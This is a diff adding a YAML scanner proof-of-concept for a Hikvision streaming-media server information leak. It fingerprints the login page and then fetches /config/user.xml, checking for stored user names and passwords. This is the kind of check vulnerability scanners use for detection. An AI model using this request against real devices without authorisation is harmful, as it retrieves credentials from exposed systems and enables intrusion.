@@ -1,0 +1,32 @@
+id: poc-yaml-hikvision-info-leak
+info:
+  name: Hikvision 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Hikvision
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<TITLE>流媒体管理服务器</TITLE>") && contains(body,
+    "海康威视")
+  output: []
+- method: GET
+  path: /config/user.xml
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<user name=\"") && contains(body,
+    " password=\"")
+  output: []
